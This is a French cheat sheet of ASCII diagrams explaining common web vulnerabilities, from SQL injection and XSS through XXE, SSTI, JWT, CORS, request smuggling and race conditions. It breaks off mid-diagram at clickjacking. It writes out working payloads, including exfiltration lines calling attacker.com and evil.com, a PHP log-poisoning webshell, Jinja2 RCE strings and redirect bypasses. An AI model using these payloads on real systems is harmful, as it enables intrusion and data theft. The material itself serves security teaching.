# 🎨 Schémas Visuels - Vulnérabilités Web

Représentations visuelles pour comprendre les failles web.

---

## 📌 SQL Injection

```
    ┌────────────────────────────────────────────────────────────────┐
    │                      SQL INJECTION                             │
    │                                                                │
    │   INPUT NORMAL:                                                │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │  Login: admin                                            │ │
    │   │  Query: SELECT * FROM users WHERE user='admin'           │ │
    │   │  Résultat: Données de admin                              │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    │   INPUT MALVEILLANT:                                           │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │  Login: admin' OR '1'='1                                 │ │
    │   │  Query: SELECT * FROM users WHERE user='admin' OR '1'='1'│ │
    │   │  Résultat: TOUS les utilisateurs! 💀                     │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    │   FLUX:                                                        │
    │   ┌────────┐      ┌────────┐      ┌────────┐                   │
    │   │  User  │─────▶│  App   │─────▶│   DB   │                   │
    │   │ Input  │      │  Code  │      │ Query  │                   │
    │   └────────┘      └────────┘      └────────┘                   │
    │       │               │               │                        │
    │       │               │               │                        │
    │   admin'--        Non filtré      Exécuté!                     │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  TYPES DE SQL INJECTION                                        │
    │                                                                │
    │  ┌─────────────────────────────────────────────────────────┐   │
    │  │  IN-BAND (résultat visible)                             │   │
    │  │  ├── Error-based: ' → erreur SQL affichée               │   │
    │  │  └── UNION-based: ' UNION SELECT password FROM users--  │   │
    │  │                                                         │   │
    │  │  BLIND (pas de résultat visible)                        │   │
    │  │  ├── Boolean: ' AND 1=1-- (true) vs ' AND 1=2-- (false) │   │
    │  │  └── Time-based: ' AND SLEEP(5)-- (délai = vrai)        │   │
    │  │                                                         │   │
    │  │  OUT-OF-BAND                                            │   │
    │  │  └── DNS/HTTP exfiltration vers serveur attaquant       │   │
    │  └─────────────────────────────────────────────────────────┘   │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 XSS (Cross-Site Scripting)

### Reflected XSS
```
    ┌────────────────────────────────────────────────────────────────┐
    │                      REFLECTED XSS                             │
    │                                                                │
    │  1. Attaquant crée un lien malveillant                         │
    │     https://site.com/search?q=<script>alert(1)</script>        │
    │                                                                │
    │  2. Victime clique sur le lien                                 │
    │                                                                │
    │  ┌────────┐        ┌────────┐         ┌────────┐               │
    │  │ Victim │──GET──▶│ Server │──HTML──▶│ Victim │               │
    │  │        │   ?q=  │        │  avec   │Browser │               │
    │  │        │<script>│        │ <script>│exécute!│               │
    │  └────────┘        └────────┘         └────────┘               │
    │                                                                │
    │  3. Script s'exécute dans le navigateur de la victime          │
    │     → Vol de cookies, keylogging, phishing...                  │
    │                                                                │
    │  ⚠️ Le payload est "réfléchi" par le serveur                   │
    │     Il n'est PAS stocké                                        │
    └────────────────────────────────────────────────────────────────┘
```

### Stored XSS
```
    ┌────────────────────────────────────────────────────────────────┐
    │                       STORED XSS                               │
    │                                                                │
    │  ÉTAPE 1: Attaquant stocke le payload                          │
    │  ┌──────────┐       ┌────────┐       ┌────────┐                │
    │  │ Attacker │─POST─▶│ Server │─SAVE─▶│   DB   │                │
    │  │ Comment: │       │        │       │<script>│                │
    │  │<script>..│       │        │       │ stored │                │
    │  └──────────┘       └────────┘       └────────┘                │
    │                                                                │
    │  ÉTAPE 2: Victime visite la page                               │
    │  ┌──────────┐       ┌────────┐       ┌────────┐                │
    │  │  Victim  │──GET──│ Server │─LOAD──│   DB   │                │
    │  │          │◀─HTML─│        │◀──────│<script>│                │
    │  │ Exécute! │       │        │       │        │                │
    │  └──────────┘       └────────┘       └────────┘                │
    │                                                                │
    │  💀 PLUS DANGEREUX que Reflected:                              │
    │     Toutes les victimes qui visitent la page sont touchées!    │
    │                                                                │
    │  Exemples: Commentaires, profils, messages, forums...          │
    └────────────────────────────────────────────────────────────────┘
```

### DOM XSS
```
    ┌────────────────────────────────────────────────────────────────┐
    │                        DOM XSS                                 │
    │                                                                │
    │  ⚠️ Le serveur n'est PAS impliqué!                             │
    │     Tout se passe côté client (JavaScript)                     │
    │                                                                │
    │  URL: https://site.com/#<script>alert(1)</script>              │
    │                         ─────────────────────────              │
    │                         Fragment (pas envoyé au serveur)       │
    │                                                                │
    │  ┌──────────────────────────────────────────────────────────┐  │
    │  │  Code JS vulnérable:                                     │  │
    │  │                                                          │  │
    │  │  var hash = location.hash.substring(1);                  │  │
    │  │  document.getElementById('output').innerHTML = hash;     │  │
    │  │                         ─────────                        │  │
    │  │                         SINK dangereux!                  │  │
    │  └──────────────────────────────────────────────────────────┘  │
    │                                                                │
    │  SOURCE → SINK                                                 │
    │  location.hash → innerHTML  = XSS!                             │
    │  location.search → document.write                              │
    │  document.referrer → eval()                                    │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 CSRF (Cross-Site Request Forgery)

```
    ┌────────────────────────────────────────────────────────────────┐
    │                          CSRF                                  │
    │                                                                │
    │  SCÉNARIO: Changer l'email de la victime                       │
    │                                                                │
    │  ┌──────────────┐                                              │
    │  │ Site attacker│                                              │
    │  │              │  1. Victime visite evil.com                  │
    │  │  <form       │     (connectée à bank.com dans un autre tab) │
    │  │   action=    │                                              │
    │  │   "bank.com/ │                                              │
    │  │   transfer"> │                                              │
    │  └──────┬───────┘                                              │
    │         │                                                      │
    │         │ 2. Formulaire soumis automatiquement                 │
    │         │    avec les cookies de bank.com!                     │
    │         ▼                                                      │
    │  ┌──────────────┐                                              │
    │  │   bank.com   │  3. Bank.com voit une requête                │
    │  │              │     avec les cookies valides                 │
    │  │ POST /transfer│     → Exécute l'action! 💀                  │
    │  │ amount=10000 │                                              │
    │  │ to=attacker  │                                              │
    │  └──────────────┘                                              │
    │                                                                │
    │  LA VICTIME N'A RIEN FAIT (à part visiter evil.com)            │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  PROTECTION: CSRF Token                                        │
    │                                                                │
    │  ┌──────────────────────────────────────────────────────────┐  │
    │  │  <form action="/transfer">                               │  │
    │  │    <input type="hidden" name="csrf_token"                │  │
    │  │           value="a8f9d7c6b5e4...">  ← Unique par session │  │
    │  │    ...                                                   │  │
    │  │  </form>                                                 │  │
    │  │                                                          │  │
    │  │  L'attaquant ne peut pas deviner ce token!               │  │
    │  └──────────────────────────────────────────────────────────┘  │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 SSRF (Server-Side Request Forgery)

```
    ┌────────────────────────────────────────────────────────────────┐
    │                          SSRF                                  │
    │                                                                │
    │   NORMAL:                                                      │
    │   ┌────────┐       ┌────────┐       ┌────────────┐             │
    │   │  User  │──────▶│ Server │──────▶│  External  │             │
    │   │        │  url= │        │       │   Image    │             │
    │   │        │ imgur │  Fetch │       │            │             │
    │   └────────┘       └────────┘       └────────────┘             │
    │                                                                │
    │   ATTAQUE:                                                     │
    │   ┌────────┐       ┌────────┐       ┌────────────┐             │
    │   │  User  │──────▶│ Server │──────▶│  Internal  │             │
    │   │        │  url= │        │       │  Service   │             │
    │   │        │ local │  Fetch │       │ 127.0.0.1  │             │
    │   │        │ host  │        │       │ 169.254... │             │
    │   └────────┘       └────────┘       └────────────┘             │
    │                                          │                     │
    │                                          ▼                     │
    │                                    ┌───────────┐               │
    │                                    │ Admin     │               │
    │                                    │ Panel     │               │
    │                                    │ Cloud     │               │
    │                                    │ Metadata  │               │
    │                                    └───────────┘               │
    │                                                                │
    │   💀 Le serveur fait des requêtes que l'attaquant              │
    │      ne pourrait pas faire directement!                        │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  CIBLES SSRF                                                   │
    │                                                                │
    │  ┌─────────────────────────────────────────────────────────┐   │
    │  │  Cloud Metadata:                                        │   │
    │  │  • AWS:   http://169.254.169.254/latest/meta-data/      │   │
    │  │  • GCP:   http://metadata.google.internal/              │   │
    │  │  • Azure: http://169.254.169.254/metadata/              │   │
    │  │                                                         │   │
    │  │  Services internes:                                     │   │
    │  │  • http://localhost/admin                               │   │
    │  │  • http://192.168.1.1/                                  │   │
    │  │  • http://internal-db:3306/                             │   │
    │  │                                                         │   │
    │  │  Protocoles:                                            │   │
    │  │  • file:///etc/passwd                                   │   │
    │  │  • gopher://...                                         │   │
    │  │  • dict://...                                           │   │
    │  └─────────────────────────────────────────────────────────┘   │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 XXE (XML External Entity)

```
    ┌────────────────────────────────────────────────────────────────┐
    │                           XXE                                  │
    │                                                                │
    │   XML NORMAL:                                                  │
    │   ┌─────────────────────────────────────────────────────────┐  │
    │   │  <?xml version="1.0"?>                                  │  │
    │   │  <user>                                                 │  │
    │   │    <name>John</name>                                    │  │
    │   │  </user>                                                │  │
    │   └─────────────────────────────────────────────────────────┘  │
    │                                                                │
    │   XML MALVEILLANT:                                             │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │  <?xml version="1.0"?>                                   │ │
    │   │  <!DOCTYPE foo [                                         │ │
    │   │    <!ENTITY xxe SYSTEM "file:///etc/passwd">             │ │
    │   │  ]>                                                      │ │
    │   │  <user>                                                  │ │
    │   │    <name>&xxe;</name>  ← Remplacé par /etc/passwd!       │ │
    │   │  </user>                                                 │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    │   FLUX:                                                        │
    │   ┌────────┐       ┌────────┐       ┌────────────┐             │
    │   │  User  │─XML──▶│ Server │─READ─▶│ /etc/passwd│             │
    │   │        │       │ Parser │       │            │             │
    │   │        │◀──────│        │◀──────│ root:x:0.. │             │
    │   │        │       │        │       │            │             │
    │   └────────┘       └────────┘       └────────────┘             │
    │                                                                │
    │   IMPACTS: Lecture fichiers, SSRF, DoS (Billion Laughs)        │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  BLIND XXE (Out-of-Band)                                       │
    │                                                                │
    │  <?xml version="1.0"?>                                         │
    │  <!DOCTYPE foo [                                               │
    │    <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">        │
    │    %xxe;                                                       │
    │  ]>                                                            │
    │                                                                │
    │  # xxe.dtd sur attacker.com:                                   │
    │  <!ENTITY % file SYSTEM "file:///etc/passwd">                  │
    │  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM                 │
    │    'http://attacker.com/?data=%file;'>">                       │
    │  %eval;                                                        │
    │  %exfil;                                                       │
    │                                                                │
    │  → Le contenu de /etc/passwd est envoyé à attacker.com!        │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 IDOR (Insecure Direct Object Reference)

```
    ┌────────────────────────────────────────────────────────────────┐
    │                          IDOR                                  │
    │                                                                │
    │   SCÉNARIO: Accéder aux données d'un autre utilisateur         │
    │                                                                │
    │   User A (ID: 123) connecté                                    │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │  GET /api/user/123/profile                               │ │
    │   │  → Données de User A ✅                                  │ │
    │   │                                                          │ │
    │   │  GET /api/user/124/profile  ← ID modifié!                │ │
    │   │  → Données de User B! 💀                                 │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    │   LE PROBLÈME:                                                 │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │  Le serveur ne vérifie PAS que User A                    │ │
    │   │  a le droit d'accéder aux données de l'ID 124!           │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    │   EXEMPLES:                                                    │
    │   • /invoice/1001 → /invoice/1002                              │
    │   • /download?file=report_123.pdf → report_124.pdf             │
    │   • /api/orders/456 → /api/orders/457                          │
    │   • /messages/inbox/789 → /messages/inbox/790                  │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  VARIANTES                                                     │
    │                                                                │
    │  Horizontal IDOR:   User A → Données User B (même rôle)        │
    │  Vertical IDOR:     User → Données Admin (escalade)            │
    │                                                                │
    │  IDs à tester:                                                 │
    │  • Numériques: 123, 124, 125...                                │
    │  • UUID: Parfois prédictibles ou dans les réponses             │
    │  • Encodés: base64(123), MD5(123)...                           │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 LFI / RFI (Local/Remote File Inclusion)

```
    ┌────────────────────────────────────────────────────────────────┐
    │                    LFI (Local File Inclusion)                  │
    │                                                                │
    │   URL normale:                                                 │
    │   https://site.com/page.php?file=home.php                      │
    │                                                                │
    │   URL malveillante:                                            │
    │   https://site.com/page.php?file=../../../etc/passwd           │
    │                             ──────────────────────             │
    │                             Path Traversal                     │
    │                                                                │
    │   Code vulnérable:                                             │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │  <?php                                                   │ │
    │   │    include($_GET['file']);  // Dangereux!                │ │
    │   │  ?>                                                      │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    │   RÉSULTAT:                                                    │
    │   Le contenu de /etc/passwd est inclus et affiché!             │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  LFI → RCE (via Log Poisoning)                                 │
    │                                                                │
    │  1. Injecter du PHP dans les logs                              │
    │     User-Agent: <?php system($_GET['cmd']); ?>                 │
    │                                                                │
    │  2. Inclure le fichier de log                                  │
    │     ?file=../../../var/log/apache2/access.log&cmd=id           │
    │                                                                │
    │  3. Le PHP est exécuté! → RCE 💀                               │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │                   RFI (Remote File Inclusion)                  │
    │                                                                │
    │   URL malveillante:                                            │
    │   https://site.com/page.php?file=http://evil.com/shell.php     │
    │                                                                │
    │   Le serveur inclut et EXÉCUTE un fichier distant!             │
    │                                                                │
    │   ⚠️ Nécessite allow_url_include=On (rare aujourd'hui)         │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  WRAPPERS PHP                                                  │
    │                                                                │
    │  # Lire en base64 (bypass filtres)                             │
    │  ?file=php://filter/convert.base64-encode/resource=config.php  │
    │                                                                │
    │  # RCE via input                                               │
    │  ?file=php://input  + POST: <?php system('id'); ?>             │
    │                                                                │
    │  # RCE via data                                                │
    │  ?file=data://text/plain,<?php system('id'); ?>                │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 Command Injection

```
    ┌────────────────────────────────────────────────────────────────┐
    │                    COMMAND INJECTION                           │
    │                                                                │
    │   Fonction: Ping un serveur                                    │
    │                                                                │
    │   Code vulnérable:                                             │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │  $ip = $_GET['ip'];                                      │ │
    │   │  system("ping -c 4 " . $ip);                             │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    │   Input normal:    ?ip=8.8.8.8                                 │
    │   Commande:        ping -c 4 8.8.8.8 ✅                        │
    │                                                                │
    │   Input malveillant: ?ip=8.8.8.8; cat /etc/passwd              │
    │   Commande:        ping -c 4 8.8.8.8; cat /etc/passwd 💀       │
    │                                     ────────────────────       │
    │                                     Commande injectée!         │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  OPÉRATEURS DE CHAÎNAGE                                        │
    │                                                                │
    │  ;      Séquence         cmd1 ; cmd2                           │
    │  &&     AND              cmd1 && cmd2 (si cmd1 réussit)        │
    │  ||     OR               cmd1 || cmd2 (si cmd1 échoue)         │
    │  |      Pipe             cmd1 | cmd2                           │
    │  `cmd`  Substitution     ping `whoami`                         │
    │  $(cmd) Substitution     ping $(whoami)                        │
    │  \n     Newline          cmd1%0acmd2                           │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  BLIND COMMAND INJECTION                                       │
    │                                                                │
    │  Pas de sortie visible? Utiliser:                              │
    │                                                                │
    │  # Time-based                                                  │
    │  ; sleep 10                (si délai → vulnérable)             │
    │                                                                │
    │  # Out-of-Band (OOB)                                           │
    │  ; curl http://attacker.com/$(whoami)                          │
    │  ; nslookup $(whoami).attacker.com                             │
    │                                                                │
    │  # Écrire dans un fichier accessible                           │
    │  ; whoami > /var/www/html/output.txt                           │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 SSTI (Server-Side Template Injection)

```
    ┌────────────────────────────────────────────────────────────────┐
    │                          SSTI                                  │
    │                                                                │
    │   TEMPLATE ENGINE: Jinja2, Twig, Freemarker, etc.              │
    │                                                                │
    │   Code vulnérable:                                             │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │  template = "Hello " + user_input                        │ │
    │   │  render(template)                                        │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    │   Input:  {{7*7}}                                              │
    │   Output: Hello 49  ← Le calcul est fait! Vulnérable!          │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  DÉTECTION                                                     │
    │                                                                │
    │  Tester:  {{7*7}}  ${7*7}  #{7*7}  *{7*7}                      │
    │                                                                │
    │  Si output = 49 → SSTI confirmé!                               │
    │                                                                │
    │  Arbre de détection:                                           │
    │                                                                │
    │             ${7*7}                                             │
    │            /      \                                            │
    │         49?       ${7*7}                                       │
    │         /           \                                          │
    │     a]${...}       {{7*7}}                                     │
    │        |           /     \                                     │
    │     Smarty      49?    {{7*7}}                                 │
    │               Jinja2    Twig                                   │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  EXPLOITATION (Jinja2 → RCE)                                   │
    │                                                                │
    │  {{ config.__class__.__init__.__globals__['os'].popen('id')    │
    │     .read() }}                                                 │
    │                                                                │
    │  {{ ''.__class__.__mro__[1].__subclasses__()[XXX]('id',        │
    │     shell=True, stdout=-1).communicate() }}                    │
    │                                                                │
    │  → RCE! 💀                                                     │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 Deserialization

```
    ┌────────────────────────────────────────────────────────────────┐
    │                    INSECURE DESERIALIZATION                    │
    │                                                                │
    │   SÉRIALISATION: Objet → Bytes (pour stockage/transfert)       │
    │   DÉSÉRIALISATION: Bytes → Objet                               │
    │                                                                │
    │   NORMAL:                                                      │
    │   ┌────────────┐ serialize  ┌────────┐ deserialize ┌────────┐  │
    │   │ User Object│ ─────────▶ │  JSON  │ ───────────▶│ Object │  │
    │   │ name: John │            │{name:..}│            │safe    │  │
    │   └────────────┘            └────────┘             └────────┘  │
    │                                                                │
    │   ATTAQUE:                                                     │
    │   ┌────────────┐            ┌────────┐            ┌────────┐   │
    │   │ Malicious  │ serialize  │ Crafted│ deserialize│ RCE!   │   │
    │   │ Object     │ ─────────▶ │ Payload│ ───────────▶│ 💀    │   │
    │   │ cmd: "id"  │            │        │            │        │   │
    │   └────────────┘            └────────┘            └────────┘   │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  FORMATS VULNÉRABLES                                           │
    │                                                                │
    │  PHP:     O:4:"User":1:{s:4:"name";s:4:"John";}                │
    │  Java:    rO0ABXNyAA... (base64) ou AC ED 00 05 (hex)          │
    │  Python:  Pickle - \x80\x04\x95...                             │
    │  .NET:    AAEAAAD/////... (BinaryFormatter)                    │
    │                                                                │
    │  MAGIC BYTES:                                                  │
    │  • Java:   AC ED 00 05 (ou rO0 en base64)                      │
    │  • .NET:   AAEAAAD                                             │
    │  • PHP:    O: ou a: ou s:                                      │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  OUTILS                                                        │
    │                                                                │
    │  Java:   ysoserial                                             │
    │          java -jar ysoserial.jar CommonsCollections5 'id'      │
    │                                                                │
    │  PHP:    phpggc                                                │
    │          phpggc Laravel/RCE1 system 'id'                       │
    │                                                                │
    │  .NET:   ysoserial.net                                         │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 JWT Attacks

```
    ┌────────────────────────────────────────────────────────────────┐
    │                      JWT STRUCTURE                             │
    │                                                                │
    │   eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9.SflKxwRJSMe...     │
    │   ──────────────────── ─────────────────────── ────────────    │
    │         HEADER              PAYLOAD             SIGNATURE      │
    │       (base64)            (base64)             (base64)        │
    │                                                                │
    │   Header:   {"alg": "HS256", "typ": "JWT"}                     │
    │   Payload:  {"user": "john", "role": "user"}                   │
    │   Signature: HMAC(header.payload, SECRET)                      │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  ATTAQUE 1: Algorithm None                                     │
    │                                                                │
    │  Header modifié: {"alg": "none"}                               │
    │  Payload modifié: {"user": "admin", "role": "admin"}           │
    │  Signature: (vide)                                             │
    │                                                                │
    │  Token: eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.            │
    │                                                     ^ vide     │
    │                                                                │
    │  Si le serveur accepte alg=none → bypass signature!            │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  ATTAQUE 2: RS256 → HS256 (Algorithm Confusion)                │
    │                                                                │
    │  Original:  RS256 (asymétrique: private key signe,             │
    │             public key vérifie)                                │
    │                                                                │
    │  Attaque:   Changer en HS256 (symétrique)                      │
    │             Signer avec la PUBLIC KEY (qui est publique!)      │
    │                                                                │
    │  Si le serveur utilise la même clé pour vérifier:              │
    │  verify(token, public_key)  ← Valide! 💀                       │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  ATTAQUE 3: Weak Secret                                        │
    │                                                                │
    │  Si secret = "password123"                                     │
    │                                                                │
    │  # Cracker avec hashcat                                        │
    │  hashcat -m 16500 jwt.txt wordlist.txt                         │
    │                                                                │
    │  → Secret trouvé → Forger n'importe quel token!                │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 CORS Misconfiguration

```
    ┌────────────────────────────────────────────────────────────────┐
    │                    CORS MISCONFIGURATION                       │
    │                                                                │
    │   CORS NORMAL (Sécurisé):                                      │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │  Access-Control-Allow-Origin: https://trusted.com        │ │
    │   │                                                          │ │
    │   │  → Seul trusted.com peut faire des requêtes cross-origin │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    │   CORS VULNÉRABLE:                                             │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │  Access-Control-Allow-Origin: *                          │ │
    │   │  ou                                                      │ │
    │   │  Access-Control-Allow-Origin: https://evil.com           │ │
    │   │  Access-Control-Allow-Credentials: true                  │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  EXPLOITATION                                                  │
    │                                                                │
    │  Sur evil.com:                                                 │
    │  ┌──────────────────────────────────────────────────────────┐  │
    │  │  <script>                                                │  │
    │  │  fetch('https://bank.com/api/account', {                 │  │
    │  │    credentials: 'include'  // Envoie les cookies!        │  │
    │  │  })                                                      │  │
    │  │  .then(r => r.json())                                    │  │
    │  │  .then(data => {                                         │  │
    │  │    // Envoyer les données volées                         │  │
    │  │    fetch('https://evil.com/steal?data=' + data);         │  │
    │  │  });                                                     │  │
    │  │  </script>                                               │  │
    │  └──────────────────────────────────────────────────────────┘  │
    │                                                                │
    │  Victime visite evil.com → Ses données bancaires sont volées!  │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 Open Redirect

```
    ┌────────────────────────────────────────────────────────────────┐
    │                       OPEN REDIRECT                            │
    │                                                                │
    │   URL légitime:                                                │
    │   https://trusted.com/redirect?url=https://trusted.com/home    │
    │                                                                │
    │   URL malveillante:                                            │
    │   https://trusted.com/redirect?url=https://evil.com            │
    │   ─────────────────────────────────                            │
    │   Semble être sur trusted.com!                                 │
    │                                                                │
    │   FLUX:                                                        │
    │   ┌────────┐       ┌──────────────┐       ┌────────┐           │
    │   │ Victim │─────▶ │ trusted.com  │─302──▶│evil.com│           │
    │   │        │ click │  /redirect   │       │phishing│           │
    │   │        │       │  ?url=evil   │       │ page   │           │
    │   └────────┘       └──────────────┘       └────────┘           │
    │                                                                │
    │   💀 IMPACT:                                                   │
    │   • Phishing (page de login falsifiée)                         │
    │   • Vol de token OAuth (redirect_uri)                          │
    │   • Bypass de filtres                                          │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  BYPASS                                                        │
    │                                                                │
    │  ?url=//evil.com                                               │
    │  ?url=https://trusted.com@evil.com                             │
    │  ?url=https://trusted.com.evil.com                             │
    │  ?url=https://evil.com%00.trusted.com                          │
    │  ?url=https://evil.com#.trusted.com                            │
    │  ?url=////evil.com                                             │
    │  ?url=https:evil.com                                           │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 HTTP Request Smuggling

```
    ┌────────────────────────────────────────────────────────────────┐
    │                   HTTP REQUEST SMUGGLING                       │
    │                                                                │
    │   ARCHITECTURE:                                                │
    │   ┌────────┐       ┌────────────┐       ┌────────┐             │
    │   │ Client │──────▶│ Front-end  │──────▶│Back-end│             │
    │   │        │       │ (CDN/Proxy)│       │(Origin)│             │
    │   └────────┘       └────────────┘       └────────┘             │
    │                                                                │
    │   PROBLÈME: Front-end et Back-end interprètent                 │
    │             différemment la fin d'une requête!                 │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  CL.TE (Content-Length vs Transfer-Encoding)                   │
    │                                                                │
    │  Front-end utilise: Content-Length                             │
    │  Back-end utilise: Transfer-Encoding                           │
    │                                                                │
    │  POST / HTTP/1.1                                               │
    │  Host: vulnerable.com                                          │
    │  Content-Length: 13    ← Front-end lit 13 bytes                │
    │  Transfer-Encoding: chunked  ← Back-end lit les chunks         │
    │                                                                │
    │  0                                                             │
    │                                                                │
    │  GET /admin HTTP/1.1   ← "Smuggled" dans la prochaine req!     │
    │  Host: vulnerable.com                                          │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  IMPACT                                                        │
    │                                                                │
    │  • Bypass des contrôles d'accès (WAF)                          │
    │  • Hijack des requêtes d'autres utilisateurs                   │
    │  • Cache poisoning                                             │
    │  • XSS via réponse contaminée                                  │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 Cache Poisoning

```
    ┌────────────────────────────────────────────────────────────────┐
    │                      CACHE POISONING                           │
    │                                                                │
    │   NORMAL:                                                      │
    │   ┌────────┐       ┌───────┐       ┌────────┐                  │
    │   │  User  │──────▶│ Cache │──────▶│ Server │                  │
    │   └────────┘       └───┬───┘       └────────┘                  │
    │                        │                                       │
    │                   Stocke la                                    │
    │                   réponse                                      │
    │                                                                │
    │   ATTAQUE:                                                     │
    │   ┌──────────┐     ┌───────┐     ┌────────┐                    │
    │   │ Attacker │────▶│ Cache │────▶│ Server │                    │
    │   │ Requête  │     │       │     │        │                    │
    │   │ spéciale │     │Stocke │     │Répond  │                    │
    │   └──────────┘     │réponse│     │avec XSS│                    │
    │                    │poison │     │        │                    │
    │                    └───┬───┘     └────────┘                    │
    │                        │                                       │
    │                        ▼                                       │
    │   ┌──────────┐     ┌───────┐                                   │
    │   │  Victim  │────▶│ Cache │  → Reçoit la réponse empoisonnée! │
    │   │          │     │poison │                                   │
    │   └──────────┘     └───────┘                                   │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  UNKEYED INPUTS (non inclus dans la clé de cache)              │
    │                                                                │
    │  X-Forwarded-Host: evil.com                                    │
    │  X-Forwarded-Scheme: http                                      │
    │  X-Original-URL: /admin                                        │
    │                                                                │
    │  Ces headers modifient la réponse mais ne changent             │
    │  pas la clé de cache → Poison stocké pour tous!                │
    │                                                                │
    │  Exemple:                                                      │
    │  GET / HTTP/1.1                                                │
    │  Host: vulnerable.com                                          │
    │  X-Forwarded-Host: evil.com                                    │
    │                                                                │
    │  Réponse: <script src="https://evil.com/xss.js">               │
    │           Stockée en cache pour vulnerable.com/                │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 Race Conditions

```
    ┌────────────────────────────────────────────────────────────────┐
    │                      RACE CONDITION                            │
    │                                                                │
    │   SCÉNARIO: Utiliser un coupon une seule fois                  │
    │                                                                │
    │   CODE (vulnérable):                                           │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │  1. IF coupon not used:                                  │ │
    │   │  2.    apply discount                                    │ │
    │   │  3.    mark coupon as used                               │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    │   ATTAQUE (requêtes simultanées):                              │
    │                                                                │
    │   Thread 1          Thread 2          Base de données          │
    │      │                 │                    │                  │
    │      │─ Check coupon ──│                    │                  │
    │      │                 │─ Check coupon ────▶│ not used         │
    │      │◀────────────────│                    │                  │
    │      │    not used     │◀───────────────────│ not used         │
    │      │                 │                    │                  │
    │      │─ Apply ─────────│                    │                  │
    │      │                 │─ Apply ───────────▶│                  │
    │      │─ Mark used ─────│                    │                  │
    │      │                 │─ Mark used ───────▶│                  │
    │      │                 │                    │                  │
    │      ▼                 ▼                    ▼                  │
    │   Discount         Discount             Coupon used            │
    │   Applied!         Applied!             2x discount! 💀        │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  TECHNIQUE: Single-Packet Attack                               │
    │                                                                │
    │  Envoyer plusieurs requêtes dans un seul paquet TCP            │
    │  pour qu'elles arrivent EXACTEMENT en même temps.              │
    │                                                                │
    │  Outils: Burp Turbo Intruder, Python threading                 │
    └────────────────────────────────────────────────────────────────┘
```

---

## 📌 Clickjacking

```
    ┌────────────────────────────────────────────────────────────────┐
    │                      CLICKJACKING                              │
